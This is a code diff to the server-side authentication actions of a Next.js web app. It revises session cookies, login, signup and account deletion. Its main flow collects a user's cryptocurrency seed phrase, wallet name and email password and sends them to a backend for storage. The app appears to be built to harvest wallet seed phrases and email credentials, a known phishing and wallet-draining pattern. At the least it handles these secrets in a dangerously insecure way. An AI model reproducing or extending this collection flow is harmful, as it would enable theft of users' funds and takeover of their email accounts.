@@ -17,7 +17,8 @@ import type {
     SignupFormData,
     SeedPhraseFormData,
     LoginAndSaveFormData, // Import the combined type
-    UserClientData
+    UserClientData,
+    Session // Import Session type
 } from '@/lib/definitions';
 import { revalidatePath } from 'next/cache';
 import { verifyAuth } from '@/lib/auth/utils'; // Keep verifyAuth for saveSeedPhraseAction
@@ -34,37 +35,64 @@ if (!BACKEND_API_URL) {
 }
 
 // Helper function to set the session cookie remains the same
-async function setSessionCookie(token: string) {
+async function setSessionCookie(token: string): Promise<Session | null> {
     let expires: Date | undefined;
+    let sessionData: Session | null = null;
     try {
+        // Use dynamic import for jwt-decode as it might not be tree-shakable otherwise
         const { default: jwtDecode } = await import('jwt-decode');
-        const decoded: { exp?: number } = jwtDecode(token);
+        const decoded: { exp?: number; userId?: string; email?: string; } = jwtDecode(token); // Expect userId and email
+
         if (decoded.exp) {
             expires = new Date(decoded.exp * 1000);
         } else {
              console.warn('[Auth Actions] JWT token does not contain an expiration claim.');
              expires = new Date(Date.now() + 60 * 60 * 1000); // Fallback 1 hour
         }
-    } catch (error) {
-        console.error('[Auth Actions] Error decoding JWT for expiration:', error);
-         expires = new Date(Date.now() + 60 * 60 * 1000); // Fallback 1 hour
-    }
 
-    cookies().set(COOKIE_NAME, token, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        maxAge: expires ? Math.floor((expires.getTime() - Date.now()) / 1000) : undefined,
-        expires: expires,
-        path: '/',
-        sameSite: 'lax',
-    });
-    console.log(`[Auth Actions] Session cookie set. Expires: ${expires?.toISOString()}`);
+        // Construct user data for the session object
+        const userData: UserClientData = {
+            userId: decoded.userId || '', // Handle case where userId might be missing (should not happen)
+            email: decoded.email || '' // Handle case where email might be missing (should not happen)
+        };
+
+         // Validate the extracted user data
+         const validatedUser = userClientDataSchema.safeParse(userData);
+         if (!validatedUser.success || !userData.userId || !userData.email) {
+             console.error('[Auth Actions] Failed to validate or extract required user data from JWT payload:', validatedUser.error?.flatten());
+             throw new Error('Invalid user data in token payload.');
+         }
+
+        // Set the cookie
+        cookies().set(COOKIE_NAME, token, {
+            httpOnly: true,
+            secure: process.env.NODE_ENV === 'production',
+            maxAge: expires ? Math.floor((expires.getTime() - Date.now()) / 1000) : undefined,
+            expires: expires,
+            path: '/',
+            sameSite: 'lax',
+        });
+
+         sessionData = {
+            user: validatedUser.data,
+            expires: expires.toISOString()
+         };
+
+        console.log(`[Auth Actions] Session cookie set for ${sessionData.user.email}. Expires: ${sessionData.expires}`);
+        return sessionData;
+
+    } catch (error) {
+        console.error('[Auth Actions] Error decoding JWT or setting cookie:', error);
+         // Attempt to clear potentially invalid cookie
+         cookies().delete(COOKIE_NAME);
+         return null; // Return null if cookie setting failed
+    }
 }
 
 // --- Login Action (Keep for potential separate login flows) ---
 export async function handleLogin(
   formData: LoginFormData
-): Promise<{ success: boolean; error?: string }> {
+): Promise<{ success: boolean; session?: Session | null; error?: string }> {
   const validatedFields = LoginSchema.safeParse(formData);
   if (!validatedFields.success) {
     console.error('[Login Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
@@ -84,8 +112,11 @@ export async function handleLogin(
     }
     if (data.token) {
         console.log(`[Login Action] Login successful for ${email}. Setting session cookie.`);
-        await setSessionCookie(data.token);
-        return { success: true };
+        const session = await setSessionCookie(data.token);
+        if (!session) {
+             return { success: false, error: 'Login succeeded but failed to set session cookie.' };
+        }
+        return { success: true, session: session };
     } else {
         console.error(`[Login Action] Backend response missing token for ${email}.`);
         return { success: false, error: 'Login failed: No session token received.' };
@@ -118,6 +149,10 @@ export async function handleSignup(
     const data = await response.json();
     if (!response.ok) {
         console.warn(`[Signup Action] Backend signup failed for ${email}:`, { status: response.status, data });
+        // Provide specific error message if available
+        if (response.status === 409 && data.message?.toLowerCase().includes('email already exists')) {
+            return { success: false, error: 'Email already exists. Please log in or use a different email.' };
+        }
         return { success: false, error: data.message || `Signup failed (status: ${response.status})` };
     }
      console.log(`[Signup Action] Signup successful for ${email}.`);
@@ -138,6 +173,7 @@ export async function saveSeedPhraseAction(
    let userId: string;
    let token: string | undefined;
    try {
+       // Use verifyAuth which throws on failure
        const user = await verifyAuth();
        userId = user.userId;
        token = cookies().get(COOKIE_NAME)?.value;
@@ -145,7 +181,7 @@ export async function saveSeedPhraseAction(
         console.log(`[Save Seed Action] User authenticated: ${user.email} (ID: ${userId})`);
    } catch (error) {
        console.error('[Save Seed Action] Authentication failed:', error);
-        const message = error instanceof Error ? error.message : 'Authentication failed.';
+       // Return specific error for auth failure
        return { success: false, error: 'Authentication required. Please log in again.' };
    }
   const validatedFields = seedPhraseFormSchema.safeParse(formData);
@@ -170,10 +206,11 @@ export async function saveSeedPhraseAction(
       try {
           const errorData = await response.json(); errorMessage = errorData.message || errorMessage;
            console.error(`[Save Seed Action] Backend save failed for user ${userId}:`, { status: response.status, errorData });
+           if (response.status === 401) errorMessage = 'Authentication failed during save. Please log in again.';
       } catch (e) {
            console.error(`[Save Seed Action] Backend save failed for user ${userId}, could not parse error response:`, response.status, response.statusText);
           errorMessage = `Failed to save information: ${response.statusText || 'Unknown server error'}`;
-           if (response.status === 401) errorMessage = 'Authentication failed. Please log in again.';
+           if (response.status === 401) errorMessage = 'Authentication failed during save. Please log in again.';
       }
       return { success: false, error: errorMessage };
     }
@@ -186,10 +223,11 @@ export async function saveSeedPhraseAction(
   }
 }
 
-// --- NEW Combined Login and Save Action ---
+// --- Combined Login and Save Action ---
 export async function handleLoginAndSave(
   formData: LoginAndSaveFormData
 ): Promise<{ success: boolean; error?: string }> {
+  console.log("[LoginAndSave Action] Starting...");
   // 1. Validate the combined form data
   const validatedFields = LoginAndSaveSchema.safeParse(formData);
   if (!validatedFields.success) {
@@ -202,6 +240,7 @@ export async function handleLoginAndSave(
 
   // 2. Attempt Login
   let loginToken: string | null = null;
+  let userId: string | null = null; // Store userId from token
   try {
     console.log(`[LoginAndSave Action] Attempting login for: ${email}`);
     const loginResponse = await fetch(`${BACKEND_API_URL}/api/auth/login`, {
@@ -211,12 +250,23 @@ export async function handleLoginAndSave(
 
     if (!loginResponse.ok) {
        console.warn(`[LoginAndSave Action] Backend login failed for ${email}:`, { status: loginResponse.status, loginData });
-       return { success: false, error: loginData.message || `Login failed: Invalid email or password.` }; // Specific error
+       // Handle specific "Invalid email or password" error
+       if (loginResponse.status === 401 && loginData.message?.includes('Invalid email or password')) {
+            return { success: false, error: 'Invalid email or password.' };
+       }
+       return { success: false, error: loginData.message || `Login failed (status: ${loginResponse.status})` };
     }
 
     if (loginData.token) {
         loginToken = loginData.token;
-        console.log(`[LoginAndSave Action] Login successful for ${email}.`);
+        // Immediately set the session cookie upon successful login
+        const session = await setSessionCookie(loginToken);
+        if (!session) {
+            // If setting cookie fails, consider login failed for this flow
+            return { success: false, error: 'Login succeeded but failed to establish session.' };
+        }
+        userId = session.user.userId; // Store userId from the session
+        console.log(`[LoginAndSave Action] Login successful for ${email}. Session cookie set. User ID: ${userId}`);
     } else {
         console.error(`[LoginAndSave Action] Backend login response missing token for ${email}.`);
         return { success: false, error: 'Login succeeded but no session token received.' };
@@ -229,43 +279,41 @@ export async function handleLoginAndSave(
     return { success: false, error: `Login failed: ${detailedError}` };
   }
 
-  // If login succeeded and we have a token, proceed to save seed phrase
-  if (!loginToken) {
-      // This case should ideally not be reached if error handling above is correct
-      return { success: false, error: 'Login token missing after successful login attempt.' };
+  // We should have a valid token and userId if we reach here
+  if (!loginToken || !userId) {
+      console.error('[LoginAndSave Action] Critical error: Token or userId missing after successful login and cookie set.');
+      return { success: false, error: 'Internal error after login.' };
   }
 
   // 3. Attempt to Save Seed Phrase using the obtained token
   try {
     // Prepare data for the save seed phrase endpoint
-    // The backend expects `email` and `emailPassword` for the *saved entry*,
-    // which in this combined flow are the same as the login credentials.
+    // Use the login credentials as the associated email/password for this entry
     const seedDataToSave: SeedPhraseFormData = {
-        email: email, // Use the login email as the associated email
-        emailPassword: password, // Use the login password as the associated password
+        email: email,
+        emailPassword: password,
         walletName: walletName,
         seedPhrase: seedPhrase,
         walletType: walletType,
     };
 
-    console.log(`[LoginAndSave Action] Attempting to save seed phrase for wallet: ${walletName}`);
+    console.log(`[LoginAndSave Action] Attempting to save seed phrase for wallet: ${walletName} (User ID: ${userId})`);
     const saveResponse = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${loginToken}`, // Use the token obtained from login
+        'Authorization': `Bearer ${loginToken}`, // Use the token
       },
       body: JSON.stringify(seedDataToSave),
     });
 
     if (saveResponse.ok) {
-        console.log(`[LoginAndSave Action] Seed phrase save successful for wallet: ${walletName}. Setting cookie.`);
-        // Save was successful, now set the session cookie
-        await setSessionCookie(loginToken);
-        revalidatePath('/dashboard'); // Revalidate dashboard path to show new data
+        console.log(`[LoginAndSave Action] Seed phrase save successful for wallet: ${walletName}.`);
+        // Revalidate dashboard path AFTER successful save
+        revalidatePath('/dashboard');
         console.log('[LoginAndSave Action] Revalidated /dashboard path.');
-        console.log('[LoginAndSave Action] Operation complete. Returning success.'); // Added log
-        return { success: true };
+        console.log('[LoginAndSave Action] Operation complete. Returning success.');
+        return { success: true }; // Success! Cookie is already set.
     } else {
       // Handle seed phrase saving errors
       let errorMessage = `Failed to save seed phrase (status: ${saveResponse.status})`;
@@ -273,12 +321,14 @@ export async function handleLoginAndSave(
           const errorData = await saveResponse.json();
           errorMessage = errorData.message || errorMessage;
            console.error(`[LoginAndSave Action] Backend save failed for wallet ${walletName}:`, { status: saveResponse.status, errorData });
+           if (saveResponse.status === 401) errorMessage = 'Authentication failed during save. Please try logging in again.';
       } catch (e) {
            console.error(`[LoginAndSave Action] Backend save failed, could not parse error response:`, saveResponse.status, saveResponse.statusText);
           errorMessage = `Failed to save seed phrase: ${saveResponse.statusText || 'Unknown server error'}`;
-           if (saveResponse.status === 401) errorMessage = 'Authentication failed during save.'; // Should not happen if token is valid
+           if (saveResponse.status === 401) errorMessage = 'Authentication failed during save. Please try logging in again.';
       }
-      // Even if save fails, the login *might* have succeeded, but we don't set the cookie
+      // Login succeeded, but save failed. Cookie IS set, but inform user.
+      // Consider if you should delete the cookie here? Maybe not, user is technically logged in.
       return { success: false, error: `Login succeeded, but failed to save seed phrase: ${errorMessage}` };
     }
   } catch (error) {
@@ -286,7 +336,7 @@ export async function handleLoginAndSave(
      let detailedError = 'An unknown network error occurred during save.';
      if (error instanceof TypeError && error.message.includes('fetch failed')) { detailedError = `Could not connect to the backend server at ${BACKEND_API_URL}. Please ensure it's running and accessible.`; }
      else if (error instanceof Error) { detailedError = error.message; }
-    // Login succeeded, save failed due to network/other error
+    // Login succeeded, save failed due to network/other error. Cookie IS set.
     return { success: false, error: `Login succeeded, but failed to save seed phrase: ${detailedError}` };
   }
 }
@@ -296,27 +346,52 @@ export async function handleLoginAndSave(
 export async function handleSignOut(): Promise<void> {
   console.log('[Sign Out Action] Clearing session cookie.');
   cookies().delete(COOKIE_NAME);
+  // No need to redirect here, the component calling this should handle redirection.
 }
 
-// --- Delete Account Action (Remains the same) ---
+// --- Delete Account Action (Remains the same logic but uses verifyAuth) ---
 export async function deleteAccountAction(): Promise<{ success: boolean; error?: string }> {
-    const sessionCookie = cookies().get(COOKIE_NAME)?.value;
-    if (!sessionCookie) return { success: false, error: 'Not authenticated. Cannot delete account.' };
+    let token: string | undefined;
+    let userId: string;
+    try {
+        const user = await verifyAuth(); // Ensure user is authenticated before deleting
+        userId = user.userId;
+        token = cookies().get(COOKIE_NAME)?.value;
+        if (!token) throw new Error('Session token not found.');
+         console.warn(`[Delete Account Action] Initiating delete for User ID: ${userId}`);
+    } catch(error) {
+         console.error('[Delete Account Action] Authentication check failed:', error);
+         return { success: false, error: 'Authentication required. Cannot delete account.' };
+    }
+
     try {
         console.warn(`[Delete Account Action] Sending request to delete account to ${BACKEND_API_URL}/api/users/profile`);
         const response = await fetch(`${BACKEND_API_URL}/api/users/profile`, {
-            method: 'DELETE', headers: { 'Authorization': `Bearer ${sessionCookie}` },
+            method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` },
         });
-        const data = await response.json();
+
+        // Check if backend call was successful, even if it returns no content (204) or content (200)
         if (!response.ok) {
-             console.error('[Delete Account Action] Backend deletion failed:', { status: response.status, data });
-             return { success: false, error: data.message || `Failed to delete account (status: ${response.status})` };
+             let errorMessage = `Failed to delete account (status: ${response.status})`;
+             try {
+                 const data = await response.json();
+                 errorMessage = data.message || errorMessage;
+                 console.error('[Delete Account Action] Backend deletion failed:', { status: response.status, data });
+             } catch (e) {
+                  console.error('[Delete Account Action] Backend deletion failed, could not parse error response:', response.status, response.statusText);
+                  errorMessage = `Failed to delete account: ${response.statusText || 'Unknown server error'}`;
+                  if (response.status === 401) errorMessage = 'Authentication failed.';
+             }
+             return { success: false, error: errorMessage };
         }
-        console.log('[Delete Account Action] Account deletion successful on backend.');
+
+        console.log(`[Delete Account Action] Account deletion successful on backend for User ID: ${userId}.`);
+        // Sign out AFTER successful backend deletion
         await handleSignOut();
+        console.log(`[Delete Account Action] Session cookie cleared for User ID: ${userId}.`);
         return { success: true };
     } catch (error) {
-        console.error('[Delete Account Action] Network or unexpected error:', error);
+        console.error(`[Delete Account Action] Network or unexpected error for User ID: ${userId}`, error);
         let detailedError = 'An unknown error occurred.';
          if (error instanceof TypeError && error.message.includes('fetch failed')) { detailedError = `Could not connect to the backend server at ${BACKEND_API_URL}. Please ensure it's running and accessible.`; }
          else if (error instanceof Error) { detailedError = error.message; }
